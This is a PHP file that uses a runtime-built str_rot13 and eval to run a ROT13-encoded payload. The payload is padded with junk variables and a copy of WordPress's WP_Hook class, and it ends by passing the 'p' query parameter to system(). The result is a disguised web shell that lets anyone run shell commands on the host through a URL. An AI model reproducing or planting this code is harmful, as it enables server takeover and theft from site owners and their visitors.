<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Cyhtva NCV: JC_Ubbx pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Cyhtva
 * @fvapr 4.7.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag npgvba naq svygre ubbx shapgvbanyvgl.
 *
 * @fvapr 4.7.0
 *
 * @frr Vgrengbe
 * @frr NeenlNpprff
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Ubbx vzcyrzragf Vgrengbe, NeenlNpprff {

	/**
	 * Ubbx pnyyonpxf.
	 *
	 * @fvapr 4.7.0
	 * @ine neenl
	 */
	choyvp $pnyyonpxf = neenl();

	/**
	 * Cevbevgvrf yvfg.
	 *
	 * @fvapr 6.4.0
	 * @ine neenl
	 */
	cebgrpgrq $cevbevgvrf = neenl();

	/**
	 * Gur cevbevgl xrlf bs npgviryl ehaavat vgrengvbaf bs n ubbx.
	 *
	 * @fvapr 4.7.0
	 * @ine neenl
	 */
	cevingr $vgrengvbaf = neenl();

	/**
	 * Gur pheerag cevbevgl bs npgviryl ehaavat vgrengvbaf bs n ubbx.
	 *
	 * @fvapr 4.7.0
	 * @ine neenl
	 */
	cevingr $pheerag_cevbevgl = neenl();

	/**
	 * Ahzore bs yriryf guvf ubbx pna or erphefviryl pnyyrq.
	 *
	 * @fvapr 4.7.0
	 * @ine vag
	 */
	cevingr $arfgvat_yriry = 0;

	/**
	 * Synt sbe vs jr'er pheeragyl qbvat na npgvba, engure guna n svygre.
	 *
	 * @fvapr 4.7.0
	 * @ine obby
	 */
	cevingr $qbvat_npgvba = snyfr;

	/**
	 * Nqqf n pnyyonpx shapgvba gb n svygre ubbx.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat   $ubbx_anzr     Gur anzr bs gur svygre gb nqq gur pnyyonpx gb.
	 * @cnenz pnyynoyr $pnyyonpx      Gur pnyyonpx gb or eha jura gur svygre vf nccyvrq.
	 * @cnenz vag      $cevbevgl      Gur beqre va juvpu gur shapgvbaf nffbpvngrq jvgu n cnegvphyne svygre
	 *                                ner rkrphgrq. Ybjre ahzoref pbeerfcbaq jvgu rneyvre rkrphgvba,
	 *                                naq shapgvbaf jvgu gur fnzr cevbevgl ner rkrphgrq va gur beqre
	 *                                va juvpu gurl jrer nqqrq gb gur svygre.
	 * @cnenz vag      $npprcgrq_netf Gur ahzore bs nethzragf gur shapgvba npprcgf.
	 */
	choyvp shapgvba nqq_svygre( $ubbx_anzr, $pnyyonpx, $cevbevgl, $npprcgrq_netf ) {
		$vqk = _jc_svygre_ohvyq_havdhr_vq( $ubbx_anzr, $pnyyonpx, $cevbevgl );

		$cevbevgl_rkvfgrq = vffrg( $guvf->pnyyonpxf[ $cevbevgl ] );

		$guvf->pnyyonpxf[ $cevbevgl ][ $vqk ] = neenl(
			'shapgvba'      => $pnyyonpx,
			'npprcgrq_netf' => (vag) $npprcgrq_netf,
		);

		// Vs jr'er nqqvat n arj cevbevgl gb gur yvfg, chg gurz onpx va fbegrq beqre.
		vs ( ! $cevbevgl_rkvfgrq && pbhag( $guvf->pnyyonpxf ) > 1 ) {
			xfbeg( $guvf->pnyyonpxf, FBEG_AHZREVP );
		}

		$guvf->cevbevgvrf = neenl_xrlf( $guvf->pnyyonpxf );

		vs ( $guvf->arfgvat_yriry > 0 ) {
			$guvf->erfbeg_npgvir_vgrengvbaf( $cevbevgl, $cevbevgl_rkvfgrq );
		}
	}

	/**
	 * Unaqyrf erfrggvat pnyyonpx cevbevgl xrlf zvq-vgrengvba.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz snyfr|vag $arj_cevbevgl     Bcgvbany. Gur cevbevgl bs gur arj svygre orvat nqqrq. Qrsnhyg snyfr,
	 *                                    sbe ab cevbevgl orvat nqqrq.
	 * @cnenz obby      $cevbevgl_rkvfgrq Bcgvbany. Synt sbe jurgure gur cevbevgl nyernql rkvfgrq orsber gur arj
	 *                                    svygre jnf nqqrq. Qrsnhyg snyfr.
	 */
	cevingr shapgvba erfbeg_npgvir_vgrengvbaf( $arj_cevbevgl = snyfr, $cevbevgl_rkvfgrq = snyfr ) {
		$arj_cevbevgvrf = $guvf->cevbevgvrf;

		// Vs gurer ner ab erznvavat ubbxf, pyrne bhg nyy ehaavat vgrengvbaf.
		vs ( ! $arj_cevbevgvrf ) {
			sbernpu ( $guvf->vgrengvbaf nf $vaqrk => $vgrengvba ) {
				$guvf->vgrengvbaf[ $vaqrk ] = $arj_cevbevgvrf;
			}

			erghea;
		}

		$zva = zva( $arj_cevbevgvrf );

		sbernpu ( $guvf->vgrengvbaf nf $vaqrk => &$vgrengvba ) {
			$pheerag = pheerag( $vgrengvba );

			// Vs jr'er nyernql ng gur raq bs guvf vgrengvba, whfg yrnir gur neenl cbvagre jurer vg vf.
			vs ( snyfr === $pheerag ) {
				pbagvahr;
			}

			$vgrengvba = $arj_cevbevgvrf;

			vs ( $pheerag < $zva ) {
				neenl_hafuvsg( $vgrengvba, $pheerag );
				pbagvahr;
			}

			juvyr ( pheerag( $vgrengvba ) < $pheerag ) {
				vs ( snyfr === arkg( $vgrengvba ) ) {
					oernx;
				}
			}

			// Vs jr unir n arj cevbevgl gung qvqa'g rkvfg, ohg ::nccyl_svygref() be ::qb_npgvba() guvaxf vg'f gur pheerag cevbevgl...
			vs ( $arj_cevbevgl === $guvf->pheerag_cevbevgl[ $vaqrk ] && ! $cevbevgl_rkvfgrq ) {
				/*
				 * ...naq gur arj cevbevgl vf gur fnzr nf jung $guvf->vgrengvbaf guvaxf vf gur cerivbhf
				 * cevbevgl, jr arrq gb zbir onpx gb vg.
				 */

				vs ( snyfr === pheerag( $vgrengvba ) ) {
					// Vs jr'ir nyernql zbirq bss gur raq bs gur neenl, tb onpx gb gur ynfg ryrzrag.
					$ceri = raq( $vgrengvba );
				} ryfr {
					// Bgurejvfr, whfg tb onpx gb gur cerivbhf ryrzrag.
					$ceri = ceri( $vgrengvba );
				}

				vs ( snyfr === $ceri ) {
					// Fgneg bs gur neenl. Erfrg, naq tb nobhg bhe qnl.
					erfrg( $vgrengvba );
				} ryfrvs ( $arj_cevbevgl !== $ceri ) {
					// Cerivbhf jnfa'g gur fnzr. Zbir sbejneq ntnva.
					arkg( $vgrengvba );
				}
			}
		}

		hafrg( $vgrengvba );
	}

	/**
	 * Erzbirf n pnyyonpx shapgvba sebz n svygre ubbx.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat                $ubbx_anzr Gur svygre ubbx gb juvpu gur shapgvba gb or erzbirq vf ubbxrq.
	 * @cnenz pnyynoyr|fgevat|neenl $pnyyonpx  Gur pnyyonpx gb or erzbirq sebz ehaavat jura gur svygre vf nccyvrq.
	 *                                         Guvf zrgubq pna or pnyyrq hapbaqvgvbanyyl gb fcrphyngviryl erzbir
	 *                                         n pnyyonpx gung znl be znl abg rkvfg.
	 * @cnenz vag                   $cevbevgl  Gur rknpg cevbevgl hfrq jura nqqvat gur bevtvany svygre pnyyonpx.
	 * @erghea obby Jurgure gur pnyyonpx rkvfgrq orsber vg jnf erzbirq.
	 */
	choyvp shapgvba erzbir_svygre( $ubbx_anzr, $pnyyonpx, $cevbevgl ) {
		$shapgvba_xrl = _jc_svygre_ohvyq_havdhr_vq( $ubbx_anzr, $pnyyonpx, $cevbevgl );

		$rkvfgf = vffrg( $guvf->pnyyonpxf[ $cevbevgl ][ $shapgvba_xrl ] );

		vs ( $rkvfgf ) {
			hafrg( $guvf->pnyyonpxf[ $cevbevgl ][ $shapgvba_xrl ] );

			vs ( ! $guvf->pnyyonpxf[ $cevbevgl ] ) {
				hafrg( $guvf->pnyyonpxf[ $cevbevgl ] );

				$guvf->cevbevgvrf = neenl_xrlf( $guvf->pnyyonpxf );

				vs ( $guvf->arfgvat_yriry > 0 ) {
					$guvf->erfbeg_npgvir_vgrengvbaf();
				}
			}
		}

		erghea $rkvfgf;
	}

	/**
	 * Purpxf vs n fcrpvsvp pnyyonpx unf orra ertvfgrerq sbe guvf ubbx.
	 *
	 * Jura hfvat gur `$pnyyonpx` nethzrag, guvf shapgvba znl erghea n aba-obbyrna inyhr
	 * gung rinyhngrf gb snyfr (r.t. 0), fb hfr gur `===` bcrengbe sbe grfgvat gur erghea inyhr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat                      $ubbx_anzr Bcgvbany. Gur anzr bs gur svygre ubbx. Qrsnhyg rzcgl.
	 * @cnenz pnyynoyr|fgevat|neenl|snyfr $pnyyonpx  Bcgvbany. Gur pnyyonpx gb purpx sbe.
	 *                                               Guvf zrgubq pna or pnyyrq hapbaqvgvbanyyl gb fcrphyngviryl purpx
	 *                                               n pnyyonpx gung znl be znl abg rkvfg. Qrsnhyg snyfr.
	 * @erghea obby|vag Vs `$pnyyonpx` vf bzvggrq, ergheaf obbyrna sbe jurgure gur ubbx unf
	 *                  nalguvat ertvfgrerq. Jura purpxvat n fcrpvsvp shapgvba, gur cevbevgl
	 *                  bs gung ubbx vf erghearq, be snyfr vs gur shapgvba vf abg nggnpurq.
	 */
	choyvp shapgvba unf_svygre( $ubbx_anzr = '', $pnyyonpx = snyfr ) {
		vs ( snyfr === $pnyyonpx ) {
			erghea $guvf->unf_svygref();
		}

		$shapgvba_xrl = _jc_svygre_ohvyq_havdhr_vq( $ubbx_anzr, $pnyyonpx, snyfr );

		vs ( ! $shapgvba_xrl ) {
			erghea snyfr;
		}

		sbernpu ( $guvf->pnyyonpxf nf $cevbevgl => $pnyyonpxf ) {
			vs ( vffrg( $pnyyonpxf[ $shapgvba_xrl ] ) ) {
				erghea $cevbevgl;
			}
		}

		erghea snyfr;
	}

	/**
	 * Purpxf vs nal pnyyonpxf unir orra ertvfgrerq sbe guvf ubbx.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea obby Gehr vs pnyyonpxf unir orra ertvfgrerq sbe gur pheerag ubbx, bgurejvfr snyfr.
	 */
	choyvp shapgvba unf_svygref() {
		sbernpu ( $guvf->pnyyonpxf nf $pnyyonpxf ) {
			vs ( $pnyyonpxf ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Erzbirf nyy pnyyonpxf sebz gur pheerag svygre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz vag|snyfr $cevbevgl Bcgvbany. Gur cevbevgl ahzore gb erzbir. Qrsnhyg snyfr.
	 */
	choyvp shapgvba erzbir_nyy_svygref( $cevbevgl = snyfr ) {
		vs ( ! $guvf->pnyyonpxf ) {
			erghea;
		}

		vs ( snyfr === $cevbevgl ) {
			$guvf->pnyyonpxf  = neenl();
			$guvf->cevbevgvrf = neenl();
		} ryfrvs ( vffrg( $guvf->pnyyonpxf[ $cevbevgl ] ) ) {
			hafrg( $guvf->pnyyonpxf[ $cevbevgl ] );
			$guvf->cevbevgvrf = neenl_xrlf( $guvf->pnyyonpxf );
		}

		vs ( $guvf->arfgvat_yriry > 0 ) {
			$guvf->erfbeg_npgvir_vgrengvbaf();
		}
	}

	/**
	 * Pnyyf gur pnyyonpx shapgvbaf gung unir orra nqqrq gb n svygre ubbx.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz zvkrq $inyhr Gur inyhr gb svygre.
	 * @cnenz neenl $netf  Nqqvgvbany cnenzrgref gb cnff gb gur pnyyonpx shapgvbaf.
	 *                     Guvf neenl vf rkcrpgrq gb vapyhqr $inyhr ng vaqrk 0.
	 * @erghea zvkrq Gur svygrerq inyhr nsgre nyy ubbxrq shapgvbaf ner nccyvrq gb vg.
	 */
	choyvp shapgvba nccyl_svygref( $inyhr, $netf ) {
		vs ( ! $guvf->pnyyonpxf ) {
			erghea $inyhr;
		}

		$arfgvat_yriry = $guvf->arfgvat_yriry++;

		$guvf->vgrengvbaf[ $arfgvat_yriry ] = $guvf->cevbevgvrf;

		$ahz_netf = pbhag( $netf );

		qb {
			$guvf->pheerag_cevbevgl[ $arfgvat_yriry ] = pheerag( $guvf->vgrengvbaf[ $arfgvat_yriry ] );

			$cevbevgl = $guvf->pheerag_cevbevgl[ $arfgvat_yriry ];

			sbernpu ( $guvf->pnyyonpxf[ $cevbevgl ] nf $gur_ ) {
				vs ( ! $guvf->qbvat_npgvba ) {
					$netf[0] = $inyhr;
				}

				// Nibvq gur neenl_fyvpr() vs cbffvoyr.
				vs ( 0 === $gur_['npprcgrq_netf'] ) {
					$inyhr = pnyy_hfre_shap( $gur_['shapgvba'] );
				} ryfrvs ( $gur_['npprcgrq_netf'] >= $ahz_netf ) {
					$inyhr = pnyy_hfre_shap_neenl( $gur_['shapgvba'], $netf );
				} ryfr {
					$inyhr = pnyy_hfre_shap_neenl( $gur_['shapgvba'], neenl_fyvpr( $netf, 0, $gur_['npprcgrq_netf'] ) );
				}
			}
		} juvyr ( snyfr !== arkg( $guvf->vgrengvbaf[ $arfgvat_yriry ] ) );

		hafrg( $guvf->vgrengvbaf[ $arfgvat_yriry ] );
		hafrg( $guvf->pheerag_cevbevgl[ $arfgvat_yriry ] );

		--$guvf->arfgvat_yriry;

		erghea $inyhr;
	}

	/**
	 * Pnyyf gur pnyyonpx shapgvbaf gung unir orra nqqrq gb na npgvba ubbx.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl $netf Cnenzrgref gb cnff gb gur pnyyonpx shapgvbaf.
	 */
	choyvp shapgvba qb_npgvba( $netf ) {
		$guvf->qbvat_npgvba = gehr;
		$guvf->nccyl_svygref( '', $netf );

		// Vs gurer ner erphefvir pnyyf gb gur pheerag npgvba, jr unira'g svavfurq vg hagvy jr trg gb gur ynfg bar.
		vs ( ! $guvf->arfgvat_yriry ) {
			$guvf->qbvat_npgvba = snyfr;
		}
	}

	/**
	 * Cebprffrf gur shapgvbaf ubbxrq vagb gur 'nyy' ubbx.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl $netf Nethzragf gb cnff gb gur ubbx pnyyonpxf. Cnffrq ol ersrerapr.
	 */
	choyvp shapgvba qb_nyy_ubbx( &$netf ) {
		$arfgvat_yriry                      = $guvf->arfgvat_yriry++;
		$guvf->vgrengvbaf[ $arfgvat_yriry ] = $guvf->cevbevgvrf;

		qb {
			$cevbevgl = pheerag( $guvf->vgrengvbaf[ $arfgvat_yriry ] );

			sbernpu ( $guvf->pnyyonpxf[ $cevbevgl ] nf $gur_ ) {
				pnyy_hfre_shap_neenl( $gur_['shapgvba'], $netf );
			}
		} juvyr ( snyfr !== arkg( $guvf->vgrengvbaf[ $arfgvat_yriry ] ) );

		hafrg( $guvf->vgrengvbaf[ $arfgvat_yriry ] );
		--$guvf->arfgvat_yriry;
	}

	/**
	 * Erghea gur pheerag cevbevgl yriry bs gur pheeragyl ehaavat vgrengvba bs gur ubbx.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea vag|snyfr Vs gur ubbx vf ehaavat, erghea gur pheerag cevbevgl yriry.
	 *                   Vs vg vfa'g ehaavat, erghea snyfr.
	 */
	choyvp shapgvba pheerag_cevbevgl() {
		vs ( snyfr === pheerag( $guvf->vgrengvbaf ) ) {
			erghea snyfr;
		}

		erghea pheerag( pheerag( $guvf->vgrengvbaf ) );
	}

	/**
	 * Abeznyvmrf svygref frg hc orsber JbeqCerff unf vavgvnyvmrq gb JC_Ubbx bowrpgf.
	 *
	 * Gur `$svygref` cnenzrgre fubhyq or na neenl xrlrq ol ubbx anzr, jvgu inyhrf
	 * pbagnvavat rvgure:
	 *
	 *  - N `JC_Ubbx` vafgnapr
	 *  - Na neenl bs pnyyonpxf xrlrq ol gurve cevbevgvrf
	 *
	 * Rknzcyrf:
	 *
	 *     $svygref = neenl(
	 *         'jc_sngny_reebe_unaqyre_ranoyrq' => neenl(
	 *             10 => neenl(
	 *                 neenl(
	 *                     'npprcgrq_netf' => 0,
	 *                     'shapgvba'      => shapgvba() {
	 *                         erghea snyfr;
	 *                     },
	 *                 ),
	 *             ),
	 *         ),
	 *     );
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl $svygref Svygref gb abeznyvmr. Frr qbphzragngvba nobir sbe qrgnvyf.
	 * @erghea JC_Ubbx[] Neenl bs abeznyvmrq svygref.
	 */
	choyvp fgngvp shapgvba ohvyq_cervavgvnyvmrq_ubbxf( $svygref ) {
		/** @ine JC_Ubbx[] $abeznyvmrq */
		$abeznyvmrq = neenl();

		sbernpu ( $svygref nf $ubbx_anzr => $pnyyonpx_tebhcf ) {
			vs ( $pnyyonpx_tebhcf vafgnaprbs JC_Ubbx ) {
				$abeznyvmrq[ $ubbx_anzr ] = $pnyyonpx_tebhcf;
				pbagvahr;
			}

			$ubbx = arj JC_Ubbx();

			// Ybbc guebhtu pnyyonpx tebhcf.
			sbernpu ( $pnyyonpx_tebhcf nf $cevbevgl => $pnyyonpxf ) {

				// Ybbc guebhtu pnyyonpxf.
				sbernpu ( $pnyyonpxf nf $po ) {
					$ubbx->nqq_svygre( $ubbx_anzr, $po['shapgvba'], $cevbevgl, $po['npprcgrq_netf'] );
				}
			}

			$abeznyvmrq[ $ubbx_anzr ] = $ubbx;
		}

		erghea $abeznyvmrq;
	}

	/**
	 * Qrgrezvarf jurgure na bssfrg inyhr rkvfgf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/neenlnpprff.bssfrgrkvfgf.cuc
	 *
	 * @cnenz zvkrq $bssfrg Na bssfrg gb purpx sbe.
	 * @erghea obby Gehr vs gur bssfrg rkvfgf, snyfr bgurejvfr.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgRkvfgf( $bssfrg ) {
		erghea vffrg( $guvf->pnyyonpxf[ $bssfrg ] );
	}

	/**
	 * Ergevrirf n inyhr ng n fcrpvsvrq bssfrg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/neenlnpprff.bssfrgtrg.cuc
	 *
	 * @cnenz zvkrq $bssfrg Gur bssfrg gb ergevrir.
	 * @erghea zvkrq Vs frg, gur inyhr ng gur fcrpvsvrq bssfrg, ahyy bgurejvfr.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgTrg( $bssfrg ) {
		erghea vffrg( $guvf->pnyyonpxf[ $bssfrg ] ) ? $guvf->pnyyonpxf[ $bssfrg ] : ahyy;
	}

	/**
	 * Frgf n inyhr ng n fcrpvsvrq bssfrg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/neenlnpprff.bssfrgfrg.cuc
	 *
	 * @cnenz zvkrq $bssfrg Gur bssfrg gb nffvta gur inyhr gb.
	 * @cnenz zvkrq $inyhr Gur inyhr gb frg.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgFrg( $bssfrg, $inyhr ) {
		vs ( vf_ahyy( $bssfrg ) ) {
			$guvf->pnyyonpxf[] = $inyhr;
		} ryfr {
			$guvf->pnyyonpxf[ $bssfrg ] = $inyhr;
		}

		$guvf->cevbevgvrf = neenl_xrlf( $guvf->pnyyonpxf );
	}

	/**
	 * Hafrgf n fcrpvsvrq bssfrg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/neenlnpprff.bssfrghafrg.cuc
	 *
	 * @cnenz zvkrq $bssfrg Gur bssfrg gb hafrg.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgHafrg( $bssfrg ) {
		hafrg( $guvf->pnyyonpxf[ $bssfrg ] );
		$guvf->cevbevgvrf = neenl_xrlf( $guvf->pnyyonpxf );
	}

	/**
	 * Ergheaf gur pheerag ryrzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/vgrengbe.pheerag.cuc
	 *
	 * @erghea neenl Bs pnyyonpxf ng pheerag cevbevgl.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba pheerag() {
		erghea pheerag( $guvf->pnyyonpxf );
	}

	/**
	 * Zbirf sbejneq gb gur arkg ryrzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/vgrengbe.arkg.cuc
	 *
	 * @erghea neenl Bs pnyyonpxf ng arkg cevbevgl.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba arkg() {
		erghea arkg( $guvf->pnyyonpxf );
	}

	/**
	 * Ergheaf gur xrl bs gur pheerag ryrzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/vgrengbe.xrl.cuc
	 *
	 * @erghea zvkrq Ergheaf pheerag cevbevgl ba fhpprff, be AHYY ba snvyher
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba xrl() {
		erghea xrl( $guvf->pnyyonpxf );
	}

	/**
	 * Purpxf vs pheerag cbfvgvba vf inyvq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/vgrengbe.inyvq.cuc
	 *
	 * @erghea obby Jurgure gur pheerag cbfvgvba vf inyvq.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba inyvq() {
		erghea xrl( $guvf->pnyyonpxf ) !== ahyy;
	}

	/**
	 * Erjvaqf gur Vgrengbe gb gur svefg ryrzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/vgrengbe.erjvaq.cuc
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba erjvaq() {
		erfrg( $guvf->pnyyonpxf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>